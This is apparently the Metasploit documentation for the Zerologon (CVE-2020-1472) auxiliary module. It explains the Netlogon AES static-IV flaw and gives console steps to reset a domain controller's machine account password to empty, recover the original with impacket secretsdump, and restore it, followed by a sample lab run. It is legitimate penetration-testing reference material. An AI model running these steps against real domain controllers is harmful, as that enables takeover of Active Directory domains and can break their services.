## Vulnerable Application
A vulnerability exists within the Netlogon authentication process where the security properties granted by AES are lost
due to an implementation flaw related to the use of a static initialization vector (IV). An attacker can leverage this
flaw to target an Active Directory Domain Controller and make repeated authentication attempts using NULL data fields
which will succeed every 1 in 256 tries (~0.4%). This module leverages the vulnerability to reset the machine account
password to an empty value, which will then allow the attacker to authenticate as the machine account. After
exploitation, it's important to restore this password to it's original value. Failure to do so can result in service
instability.

Before using this module and changing the Domain Controller's machine account password, it is **highly** recommended to
have [impacket](https://github.com/SecureAuthCorp/impacket) available to recover the original value for restoration. The
version of impacket must have been updated on or since September 15th, 2020 to incorporate the changes introduced in
commit [`78e8c8e4`](https://github.com/SecureAuthCorp/impacket/commit/78e8c8e41b3f163f1271a01ce3f2bf3bb880f687) which
altered the behavior of the `example/secretsdump.py` utility to display the plaintext value of the machine account
password. Users can use this value along with the `RESTORE` action provided by this module to restore the machine
account password to it's original value.

## Verification Steps

1. Exploit the vulnerability to set the machine account password to a blank value
    1. From msfconsole
    1. Do: `use auxiliary/admin/dcerpc/cve_2020_1472_zerologon`
    1. Set the `RHOSTS` and `NBNAME` values
    1. Run the module and see that the password was set to a blank value
1. Recover the original machine account password using impacket and secretsdump
    1. Run `examples/secretsdump.py -no-pass NBNAME$@RHOST`
        * **Note:** The machine name (`NBNAME` from the module) must end with the dollar sign character (`$`)
    1. Search for the password in the output (`NBNAME$:plain_password_hex:`)
1. Restore the original machine account password
    1. From msfconsole
    1. Do: `use auxiliary/admin/dcerpc/cve_2020_1472_zerologon`
    1. Set the action to `RESTORE`
    1. Set the `RHOSTS`, `NBNAME` and `PASSWORD` values
    1. Run the module and see that the original value was restored

## Options

### NBNAME

The NetBIOS name of the target domain controller. You can use the `auxiliary/scanner/netbios/nbname` module to obtain
this value.

## Scenarios

### Windows Server 2019

```
[*] 192.168.159.10:0 - Connecting to the endpoint mapper service...
[*] 192.168.159.10:49667 - Binding to 12345678-1234-abcd-ef00-01234567cffb:1.0@ncacn_ip_tcp:192.168.159.10[49667] ...
[*] 192.168.159.10:49667 - Bound to 12345678-1234-abcd-ef00-01234567cffb:1.0@ncacn_ip_tcp:192.168.159.10[49667] ...
[+] 192.168.159.10:49667 - Successfully authenticated
[+] 192.168.159.10:49667 - Successfully set the machine account (WIN-3MSP8K2LCGC$) password to: aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 (empty)
[*] Auxiliary module execution completed
```
